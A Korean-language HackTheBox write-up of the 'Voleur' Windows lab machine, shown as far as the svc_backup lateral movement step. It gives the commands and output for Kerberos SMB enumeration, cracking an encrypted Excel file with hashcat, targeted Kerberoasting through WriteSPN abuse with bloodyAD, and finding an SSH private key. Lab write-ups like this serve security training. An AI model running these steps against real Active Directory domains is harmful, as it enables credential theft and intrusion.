![Voleur](/assets/htb-windows/voleur/voleur.png)

**Voleur**는 Medium 난이도의 Windows 머신으로, 저권한 도메인 계정에서 시작하여 Kerberos 기반 환경에서 **SMB 공유**를 통해 암호로 보호된 **Excel 파일을 발견**하고 해시 크랙을 통해 비밀번호를 획득한다. 

이후, 서비스 계정의 **WriteSPN** 권한을 활용한 타겟 Kerberoasting으로 추가 자격 증명을 확보하고 시스템 접근 권한을 확장하며, 이후 그룹 권한을 이용해 삭제된 도메인 사용자를 복구하고 **해당 계정의 DPAPI 보호 Credential을 복호화**하여 더 높은 권한의 계정을 획득한다

이를 기반으로 백업 서비스 계정의 `SSH` 개인키를 발견해 비표준 포트로 리눅스 서브시스템에 접근한 뒤 `NTDS.dit`, `SYSTEM` 백업 파일을 추출하여 `Administrator`의 NT 해시를 획득하고 최종적으로 관리자 권한을 획득한다.

# Vulnerability Analysis

## SMB Enumeration

> 머신에서 주어진 사용자의 자격 증명은 다음과 같다: (`ryan.naylor` / `HollowOct31Nyt`)

SMB 서비스에서 `(NTLM:False)` 가 확인되며, 이는 NTLM 인증이 비활성화되어 있음을 의미한다:

```bash
$ nxc smb DC.voleur.htb -u ryan.naylor -p HollowOct31Nyt 

SMB         10.129.232.130  445    10.129.232.130   [*]  x64 (name:10.129.232.130) (domain:10.129.232.130) (signing:True) (SMBv1:False) (NTLM:False)                                                                                                                                    
SMB         10.129.232.130  445    10.129.232.130   [-] 10.129.232.130\ryan.naylor:HollowOct31Nyt STATUS_NOT_SUPPORTED
```

따라서 패스워드 기반 인증 시 NTLM이 아닌 Kerberos 인증을 사용해야 한다.

Kerberos 인증은 클라이언트와 서버 간 시간 동기화에 민감하기 때문에, 먼저 `ntpdate` 를 이용하여 시간을 동기화하였다:

```bash
$ sudo ntpdate voleur.htb

2026-04-08 08:44:16.729701 (-0400) +28805.405931 +/- 0.130476 voleur.htb 10.129.232.130 s1 no-leap
CLOCK: time stepped by 28805.405931
```

이후 Kerberos 인증을 이용하여 다시 시도한 결과, 정상적으로 인증에 성공하였다:

```bash
$ nxc smb DC.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k

SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

SMB 공유를 확인하기 위해 `--shares` 옵션을 사용하여 열거하였다:

```bash
$ nxc smb DC.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --shares

SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         DC.voleur.htb   445    DC               [*] Enumerated shares
SMB         DC.voleur.htb   445    DC               Share           Permissions     Remark
SMB         DC.voleur.htb   445    DC               -----           -----------     ------
SMB         DC.voleur.htb   445    DC               ADMIN$                          Remote Admin
SMB         DC.voleur.htb   445    DC               C$                              Default share
SMB         DC.voleur.htb   445    DC               Finance                         
SMB         DC.voleur.htb   445    DC               HR                              
SMB         DC.voleur.htb   445    DC               IPC$            READ            Remote IPC
SMB         DC.voleur.htb   445    DC               IT              READ

```

확인 결과, 기본 관리 공유(`ADMIN$`, `C$`) 외에도 여러 부서 관련 공유(`Finance`, `HR`, `IT`)가 존재하는 것을 확인할 수 있다.

Kerberos 기반 인증을 위해 `krb5.conf` 파일을 생성하였다:

```bash
$ nxc smb DC.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --generate-krb5-file krb5.conf

SMB         DC.voleur.htb   445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         DC.voleur.htb   445    DC               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```

이후 환경변수를 설정하여 해당 설정 파일을 사용하도록 지정하였다:

```bash
$ export KRB5_CONFIG=$(pwd)/krb5.conf
```

```bash
$ echo $KRB5_CONFIG       

/home/kali/htb/voleur/krb5.conf
```

`smbclient` 에서 Kerberos 인증을 사용하기 위해 `--realm` 옵션을 지정하였다:

```bash
$ smbclient //DC.voleur.htb/IT -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb   

Try "help" to get a list of possible commands.
smb: \>
```

이는 NTLM이 아닌 **Kerberos를 이용하여 비밀번호 기반 인증을 수행하는 방식**이며, 정상적으로 SMB 공유에 접근할 수 있음을 확인하였다.

```bash
  Access_Review.xlsx                  A    16896  Thu Jan 30 09:14:25 2025
```

### Password Cracking

암호화를 해제하기 위해 John the Ripper 스위트의 일부인 `office2john` 스크립트를 활용하였다:

```bash
$ office2john Access_Review.xlsx   

Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```

추출된 해시를 `hash.txt` 파일에 저장한 후, `hashcat` 을 이용하여 사전 공격을 수행하였다:

```bash
$ hashcat -m 9600 hash.txt /usr/share/wordlists/rockyou.txt --show

$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c:football1
```

이를 통해 Office 문서의 비밀번호가 **football1**임을 확인하였다.

획득한 비밀번호를 이용하여, 암호화된 Office 문서를 복호화하기 위해 [msoffcrypto-tool](https://github.com/nolze/msoffcrypto-tool)을 활용하였다:

```bash
$ msoffcrypto-tool Access_Review.xlsx decrypted.xlsx -p football1
```

복호화된 파일을 `file` 명령어로 확인한 결과, 더 이상 암호화되지 않은 정상적인 Excel 문서 형식으로 인식됨을 확인할 수 있다:

```bash
$ file decrypted.xlsx 

decrypted.xlsx: Microsoft Excel 2007+
```

이후 `xlsx2csv` 명령어를 활용하여 내부 데이터를 확인한 결과, 여러 사용자 정보와 함께 서비스 계정의 자격 증명이 평문으로 노출된 것을 확인할 수 있다

```bash
$ xlsx2csv decrypted.xlsx

User,Job Title,Permissions,Notes
Ryan.Naylor, First-Line Support Technician,SMB,Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
Marie.Bryant, First-Line Support Technician,SMB,
```

또한 `Todd.Wolfe` 계정은 퇴사자(`Leaver`)로 표시되어 있으며, 과거 비밀번호가 기록되어 있어 계정 재사용 가능성을 보여준다.

특히 서비스 계정(`svc_ldap`, `svc_iis`)의 비밀번호가 평문으로 저장되어 있는 점이 확인되며, 이는 매우 중요한 공격 벡터가 될 수 있다.

## LDAP Enumeration

획득한 서비스 계정(`svc_ldap`)을 이용하여 Active Directory 정보를 열거하기 위해 LDAP 인증을 시도하였다:

```bash
$ nxc ldap DC.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k

LDAP        DC.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        DC.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
```

해당 계정을 통해 LDAP 인증에 성공하였으며, 도메인 정보에 접근할 수 있음을 확인하였다.

또한 `svc_ldap` 계정은 `RESTORE_USERS` 그룹에 속해 있으며, 이를 통해 추가적인 권한 상승 경로로 활용될 가능성이 있다.

# Exploitation

## WriteSPN Abuse → Kerberoasting Attack

Kerberoasting 공격을 수행하기 위해 [bloodyAD](https://github.com/CravateRouge/bloodyAD)을 활용하여 `svc_winrm` 계정에 SPN을 설정하였다:

```bash
$ bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'abc/abc'

[+] svc_winrm's servicePrincipalName has been updated
```

**SPN이 설정된 계정은 Kerberos 서비스 티켓 요청이 가능**해지며, 이를 통해 **Kerberoasting 공격**이 가능하다.

설정 이후, SPN이 정상적으로 등록된 것을 확인하였다:

```bash
$ bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn get object svc_winrm --attr servicePrincipalName   

distinguishedName: CN=svc_winrm,OU=Service Accounts,DC=voleur,DC=htb
servicePrincipalName: abc/abc
```

이후 Kerberoasting을 수행하여 서비스 티켓(`TGS`)을 추출하였다:

```bash
$ nxc ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting svc_winrm                                                  
LDAP        dc.voleur.htb   389    DC               [*] None (name:DC) (domain:voleur.htb)
LDAP        dc.voleur.htb   389    DC               [+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn 
LDAP        dc.voleur.htb   389    DC               [*] Skipping disabled account: krbtgt
LDAP        dc.voleur.htb   389    DC               [*] Total of records returned 1
```

## Lateral Movement: jeremy.combs → svc_backup

### SSH Key Reuse to svc_backup

`IT` 공유 디렉토리에 접근하여 내부 구조를 확인하기 위해 `tree` 명령어를 사용하였다:

```text
PS C:\IT> tree /F

Folder PATH listing
Volume serial number is A5C3-6454
C:.
+---First-Line Support
+---Second-Line Support
+---Third-Line Support
    ¦   id_rsa
    ¦   Note.txt.txt
    ¦
    +---Backups
```

그 결과, `Third-Line Support` 디렉토리 내에 `id_rsa` 파일과 `Note.txt` 파일, 그리고 `Backups` 디렉토리까지 존재하는 것을 확인하였다.

그러나 `Backups` 디렉토리에 대해 `ls` 명령어를 통해 내부를 확인하려 했으나, 다음과 같이 접근 권한이 없어 내용을 확인할 수 없었다:

```text
PS C:\IT\Third-Line Support\Backups> ls

Access to the path 'C:\IT\Third-Line Support\Backups' is denied.
```

특히 `id_rsa` 파일은 SSH 개인 키로, 자격 증명으로 사용될 가능성이 높다.

`Note.txt` 파일의 내용을 확인하였다:

```text
PS C:\IT\Third-Line Support> cat Note.txt.txt

Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```

해당 내용을 통해 시스템에서 WSL(Windows Subsystem for Linux)이 구성되어 있으며, Linux 기반 백업 도구를 활용하고자 하는 환경임을 유추할 수 있다.

또한, Nmap 스캔 결과 SSH 서비스는 **2222번 포트**에서 동작 중인 것을 확인하였다.

초기 확보한 엑셀 파일 내 자격 증명 정보를 분석한 결과, `svc_backup` 계정을 포함한 다수의 계정이 존재하였다.
